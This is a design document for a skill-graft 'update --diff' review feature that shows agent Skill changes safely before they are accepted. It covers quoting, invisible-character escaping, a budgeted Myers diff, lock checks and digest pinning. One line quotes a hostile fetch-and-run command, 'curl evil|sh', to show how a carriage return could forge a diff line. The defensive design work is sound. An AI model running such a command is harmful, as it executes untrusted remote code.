# Design

## Context

Checked against `main` (`a290700`):

- `commands/update.py:76-79`: `update` resolves the **Hull** at the new tips, keeps only `lock.skill_hashes(hull)`,
  then `_previous` resolves it at the current **Refs** and keeps only hashes too. `compute.compute_hull` is a context
  manager: a patched **Skill**'s folder is valid only inside its `with` (`compute.py:124-126`), so neither **Hull**'s
  text survives to be compared.
- `lock.skill_hashes`: a **Skill**'s hash covers its files as vendored, `rename.rewrites(hull)` applied to the
  patched copy in `hull.skills`, and each file's executable bit (`lock.folder_hash`). It covers the **Deployed name**
  too: `rename.rewrites` writes it into the `SKILL.md`'s `name:` of a renamed or prefixed **Skill**, so a **Skill**
  deployed under another name has other bytes. A `~` line is exactly "these bytes or bits differ".
- `hull.upstream[skill]` is the **Skill**'s folder as its **Source** has it, under `hull.roots[alias]`: the lock's
  `upstream` is the folder relative to that root.
- `lock.render` records each **Skill**'s hash, and its `deployed` only when it differs from the **Skill ID**'s name.
  The lock is written by `resolve`, `build`, `update` and the editing commands (`cli.py:393,416`, `edit.py:160`), and
  never read.
- `infra/files.check_files`: a symbolic link in a **Skill** may only lead to a file inside it.
- `_previous` returns why there is no old **Hull** as a string; "not cached" is computed after the fetch loop, so by
  then any fetch this run makes has happened.

## Goals / Non-Goals

**Goals:**

- Vet an `update` before accepting it, on what reaches the agent, without **Skill** text in the terminal, and accept
  exactly the **Hull** vetted.
- One source of truth: a file is in the **Deployed diff** exactly when its bytes or bit make the hash differ.

**Non-Goals:**

- Showing what a **Source** changed upstream: the **Deployed diff** names the old and new **Ref** and the upstream
  folder; the user runs git on them as they choose. A suggested command proved a liability: folder names, git's
  path patterns, the **Source**'s attributes, the cache's fsck and a dry run's temporary cache each bent it.
- Showing the earlier text of a **Skill** edited since the lock was written, by a path **Source**, a **Patch** or
  the config: `update` names it (see "The old side checked against the lock"), but has no copy of what it was.
- Line counts in the console summary: they need the diff, and the diff runs only for `--diff`.
- Verifying the lock's hash at `build`: a later change, added to Future work.
- Flagging URLs, shell commands, scripts or visible lookalike characters inside text: Future work.

## Decisions

- **Both Hulls open at once.** `_update` enters the new **Refs'** `compute_hull`, then, inside it, the current
  ones', and builds the hashes, the **Hull diff**, the summary and the **Deployed diff** while both trees exist.
  `_previous` becomes a context manager: it works out the reason there is no old **Hull** first, in its existing
  `try`, and only then, outside any `try`, yields the old **Hull** or the reason. An error from the `with` body, such
  as a failed write, so propagates unchanged instead of being taken for a missing old **Hull**. Alternative: copy each
  changed **Skill**'s deployed files out of the first `with`; rejected, as it copies trees only to compare them.

- **The deployed view of a Skill:** `walk(folder, overrides)` yields each file's path, bytes and executable bit, the
  walk `lock.folder_hash` did (`files.skill_entries`, symlinks followed, `.git` skipped), the rewrites' bytes in place
  of the file's, reading each file only when reached. `folder_hash` hashes as it walks, one file in memory at a time;
  `deployed_files(folder, overrides) -> dict[path, (bytes, executable)]` holds a view whole, for the summary and the
  diff. One walk for both, so hash and diff cannot drift. Only `+` and `~` **Skills** get a view, so an unchanged
  **Skill** is read once, for its hash.

- **A new `pipeline/deployed.py`**, pure: `summary(old, new) -> list[str]` over two views (`old` empty for a `+`
  **Skill**), with no diff; `diff(old, new, budget) -> str`, the file hunks only, for `--diff` only;
  `quote(path, prefix="")`
  for both. No git, no printing; `update.py` does the I/O.

- **Console summary per file, no diff:** `<path> (new, <n> bytes)`, `<path> (removed)`,
  `<path> (changed, <old> -> <new> bytes)`, then `(now executable)` or `(no longer executable)` where they apply;
  sorted by path, at most 20 lines per **Skill**, then `… <n> more`. Comparing bytes and bits is linear, so a plain
  `update` costs no diff. Paths and
  names quoted and never cut: a cut can split an escape or make two names print alike.

- **One quoting, git's `core.quotePath` plus spaces:** `quote(path, prefix)` quotes `prefix + path` as one token, as
  git does (`"a/x\n"`, never `a/"x\n"`), when it holds a byte below 0x20, 0x7f, `"`, `\`, a non-ASCII byte or a space:
  in double quotes, with `\a \b \t \n \v \f \r \" \\` as letter escapes and every other such byte, but the space, as a
  three-digit octal escape. git leaves a space unquoted, so `run.sh` and `run.sh` with a trailing space would print
  alike. Every name from a **Source** that `update` prints or writes goes through it: file paths and upstream
  folders. So all of them are printable ASCII, and a line separator, bidi control or zero-width
  character in a folder name is octal, never raw.

- **Every file shown as text.** A file `hidden._decode` reads as text (strict UTF-8, a UTF-16 or UTF-32 byte order
  mark, or, outside Markdown, lenient UTF-8 for a file with no NUL byte) is decoded as it reads it; any other file as
  lenient UTF-8. Either way each byte that cannot be decoded is shown as a `\x..` escape. No file is ever reduced to
  `Binary files … differ`: a script with a NUL byte and a stray byte still runs, so its lines must show. `_decode`
  becomes public with an `errors` argument: the scan keeps `replace`, the diff passes `surrogateescape`, so a byte
  that cannot be decoded stays apart from the text and is escaped as itself. `hidden.decode_as` returns the encoding
  too (`UTF-8`, `UTF-16`, `UTF-32` or `lenient UTF-8`), so a file read in another encoding than before gets a line
  `# <path>: read as UTF-8, now as UTF-16`: a re-encode beside an edit would otherwise show only the edit. A file
  whose bytes differ but whose two sides decode to the same lines, re-encoded or given a byte order mark, would show a
  header and no hunk: both sides are then shown byte for byte, as lenient UTF-8, after a line
  `# <path>: shown byte for byte, as its two sides read alike as text`.

- **No line passes for another.** Lines are split at `\n` only, as git splits them, but an editor also breaks lines at
  `\r`, `\v`, `\f`, U+0085, U+2028 and U+2029: a raw `+ok\rcurl evil|sh` would show `curl evil|sh` on a line of its own,
  without its `+`, or forge a `#` line; an invisible character makes two lines look alike that are not. In each line
  these are escaped as `\x..`, `\u....` or `\U........`: every character but tab of the Unicode categories `Cc`, `Cf`,
  `Zl` and `Zp` (controls, format characters such as U+FEFF and U+180E, which neither of APM's sets holds, and the line
  and paragraph separators), read from `unicodedata` once, on the first diff; every character in `hidden.CRITICAL` or
  `hidden.WARNING`, whose variation selectors are no format characters. A category, unlike a list, cannot fall behind a
  new invisible character. `\x..` is kept for code points below U+0080 and for bytes that cannot be decoded, all from
  0x80, and every other character is `\u....` or `\U........`: a stray 0xAD and a soft hyphen would both read `\xad`. A
  typed `\x1b` still reads the same as an escaped ESC, on the same line or on another. So a shown file holding both a
  backslash and a character to escape has every backslash doubled, after a line
  `# <path>: each backslash shown doubled, so no typed escape reads as one`; other files keep single backslashes, as
  they read better.

- **A Myers diff on a step budget, git's format around it.** `difflib`'s `SequenceMatcher` is quadratic or worse on
  crafted input below any size limit, and a cap on edits alone leaves Myers at O((n + m) · D). `diff` first maps each
  distinct line of a file pair to an integer, in linear time, so comparing two lines costs one step whatever their
  length. It then counts every step against one budget for the run, 10⁷: each diagonal tried, each pair of lines
  compared along a snake, and each entry of the 2D + 1 live diagonals kept per D for the backtrack. Only those live
  diagonals are stored, each D's as an `array('i')`, never a full array per D, so time stays within the budget and
  memory within 4 bytes per budget step, 40 MB at most. A file whose diff would overrun what is left, or over 1 MB on
  either side, shows as all its old lines removed and all its new lines added, in linear time. Hunks are grouped as
  `git diff` groups them, 3 lines of context. Each file: `diff --git a/<p> b/<p>`, `new file mode`,
  `deleted file mode`, `old mode`/`new mode` (`100644`/`100755`), `--- a/<p>`/`+++ b/<p>` (`/dev/null` for a new or
  removed file), the hunks, `\ No newline at end of file` where it applies. Alternatives: `git diff --no-index`
  (follows the user's `diff.orderFile` and global attributes, which flags cannot switch off: measured in
  `bound-check-agents`); `diff -ruN` (GNU and BSD quote names differently, no modes).

- **The header,** first in the file:

  ```text
  # skill-graft Deployed diff: each Skill's text as `build` deploys it, Patches and Renames applied,
  # at the current refs against the new ones. Not what the Sources changed upstream. Untrusted text:
  # read it in an editor, not by printing it to a terminal.
  ```

  Then, per **Skill**, sorted by **Skill ID**, `# <mark> <skill id>` and data lines, then its diff:

  ```text
  # ~ mp/tdd
  # source mp: <old ref> -> <new ref>; upstream folder "<old>" -> "<new>"
  # source own: a path source
  # edited since skill-graft.lock was written: its earlier text is not shown
  ```

  The source line gives the ref once when it did not move, the folder once when it did not change, no old ref or
  folder for a `+` **Skill**, each folder `quote`d. A `-` **Skill** gets its `# - <skill id>` line alone, so a
  file of removals only does not read as no change. With no change, the header and `# hull unchanged`.

- **No previous Hull: every Skill shown as added.** When the current `ref`s do not resolve (no `ref`, one not
  cached, or **Patches** redone for the new tips that fail at the old ones), there is nothing to compare, yet that is
  when vetting matters most. The file then holds the header, the line
  `# no previous hull to compare (<reason>): every Skill shown as added`, and every **Skill** of the new **Hull** as a
  `+` **Skill**, all its files added. All text is shown, so the lock check has nothing to add and is skipped, and the
  `apply:` line is printed as after any review. The console still prints only the reason, no summary per **Skill**.

- **The old side checked against the lock.** Both **Hulls** are resolved from today's path **Sources**, **Patches**
  and config, so an edit to any of them since the lock was written looks the same on both sides and is never shown;
  an `apply:` line would then deploy it as vetted. `lock.read()` reads the lock with `tomllib`: `version` must be 1,
  and `skills` is an array of tables, each with an `id` and a `hash`, returned as **Skill ID** to hash; the hash covers
  the **Deployed name**, so the lock's optional `deployed` need not be read. Each
  **Skill** in the old **Hull** or the lock but not with the same hash in both, joined, left or changed, is printed
  after the **Hull diff** as `edited since skill-graft.lock was written, not shown: <skill id>`, marked so in the
  **Deployed diff**, and no `apply:` line follows. A missing or unreadable lock, or one of another `version`, names
  every **Skill** of the old **Hull**. "Since the lock was written", not "since the last update": `build` and the
  editing commands write it
  too, and it is what was last vendored. This makes the lock read: `docs/design.md`'s "never read back" and the lock's
  header, "never read", change. Alternatives: keep each **Skill**'s deployed text beside the lock to diff against (a
  second copy of every **Skill**, for one check); narrow the claim to what the **Refs** changed (leaves the hole).

- **`--diff` writes only its own files, named so no agent loads them.** A list of forbidden folders cannot be complete
  (`.claude/commands/`, `.claude/agents/`, `.cursor/rules/`, the next harness's), so the rule is positive. The path is
  taken as given; its folder is resolved (`parent.resolve()`), so `..` and
  symbolic links among the folders are followed, and its last part is kept. `update.update` refuses it, before
  `_select` and naming it, when:

  - its name does not end in `.diff`: harnesses load Markdown, YAML and their own formats, never a `.diff`, so the
    file is not taken for a command, rule or agent wherever it lands;
  - a folder of the path as given, without `..`, or of the resolved path is named `.apm` in any case
    (`paths.folded`, as `build --into` checks: `.APM` is the same folder on macOS and Windows), or holds a
    `SKILL.md`, so it is a **Skill**'s folder or inside one, deployed or vendored; as given too, since a harness
    walking a package or a **Skill** follows a link inside it;
  - its folder does not exist, so the run fails before fetching, not at its last write;
  - the path exists and is not a regular file (`lstat`: a symbolic link, folder, FIFO or device), so nothing blocks or
    reads without end;
  - it is a regular file whose first bytes, read up to the header's first line's length, are not that line.

  A file that passes is one `update` wrote, and is removed, so a run that fails leaves no stale diff. The text is
  built before any write, then written with `files.atomic_write`: in a dry run last, before the closing line; in a
  real `update` first, then `skill-graft.toml` and the lock, the file removed again if either of those fails. A lock
  write failing after the TOML's leaves the TOML moved, as today; this change does not make the two one write.

- **One closing line, in a dry run only.** After a real `update`, `update --dry-run --diff` compares the new **Refs**
  with themselves, so neither line follows a real `update`. A dry run that succeeded, its diff file written, prints,
  before `update`'s `finally` prints `dry run: …`, at most one of:

  - `review: skill-graft update <its aliases> --dry-run --diff <file>`, when it had no `--diff` and marks a `+` or
    `~`, or had no previous **Hull**;
  - else `apply: skill-graft update <its aliases> --expect <digest>`, with the new **Hull**'s **Hull digest**, when
    it named no **Skill** as edited since the lock was written. Otherwise some text
    was never shown, so no line is printed: the user reads those **Skills** in full, or runs `build` or `update`
    knowing they are unvetted, then reviews again.

- **`--expect <digest>` pins the result, not the inputs.** Plain `update` resolves whatever the tips, path
  **Sources**, **Patches**, **Renames** and the other `ref`s are when it runs. The **Hull digest** is what all of them
  produce: `lock.digest(hull, hashes)`, SHA-256 of the ASCII JSON of the sorted `[skill id, deployed name, hash]`
  triples of the new **Hull**. The hash already covers the **Deployed name**; the name is in as well so the digest
  does not lean on how `rename` writes it. `update` checks it once the new **Hull** is resolved and the **Hull diff**
  printed: on
  a mismatch it exits non-zero, writing neither `skill-graft.toml`, the lock nor `--diff`'s file, and says the
  **Hull** is not the one reviewed and to review again. By then a real `update` may have fetched into the cache, as
  any `update` does; the cache is not what the agent gets. The digest is checked for 64 lowercase hex before any
  fetch. Hashes are relative to each **Skill**, so a digest from one machine checks on another. Alternatives:
  `--at <alias>=<sha>` pinning each moved **Source**'s commit (leaves path **Sources**, **Patches**, **Renames** and
  unselected `ref`s unchecked); `--vetted <diff file>` reading the tips back from untrusted text.

- **"Not cached" reworded, no new detection.** `_previous`'s `'mp' ref A not cached` becomes
  `'mp' ref A is not in the cache`, followed by its likely causes: a branch the cache has not fetched since A was
  pushed (the loop fetches only when the tip is missing), history rewritten upstream, or a `ref` set to a commit on no
  branch, such as a tag's. `update` does not fetch to tell them apart: the diff is not worth a remote call.

## Risks / Trade-offs

- [Two Hulls open double the temporary space] → both already exist in turn today; only their lifetimes overlap.
- [The console no longer counts lines] → it names each file and its sizes; the counts would cost a diff on every
  `update`.
- [A large or much-changed file shows as a whole rewrite] → past 1 MB or the step budget; nothing is hidden, only
  less precise.
- [A Myers diff by hand could split hunks unlike git] → the format is git's, the hunks need not be byte-equal;
  tests check them against `git diff --no-index` on ordinary files.
- [C-quoting by hand could differ from git's in a corner case] → tested against real `git diff` on a table of names;
  the file is for reading, never for `git apply`.
- [No command for the upstream change] → the refs and folder are given; `git diff <old> <new> -- <folder>` in a clone
  is the user's to run, with their own care.
- \[Any change to the **Hull** after the review refuses `--expect`\] → then that text is unvetted, and the review runs
  again.
- \[Two `ref`s that deploy the same **Hull** both pass `--expect`\] → the lock records a `ref` the review did not name;
  the agent still gets exactly what was vetted.
- \[An invisible character outside those categories, such as U+3164 or U+2800, which Unicode files as a letter or
  symbol, shows raw\] → no rule by category reaches it, nor does the **Hidden character** check; a seeded fuzz test
  holds the rest: no raw character of those categories, and no two different one-line files read alike.
- [A binary file shows as lines of escapes] → bounded by 1 MB, and **Skills** rarely hold binaries; hiding one is the
  worse failure.
- [A hand-edited lock can make the old side look unchanged] → the lock is the user's own file; editing it hides
  nothing from them.
- \[A `SKILL.md` in an ancestor folder refuses a harmless path\] → the user picks another path; the error names why.
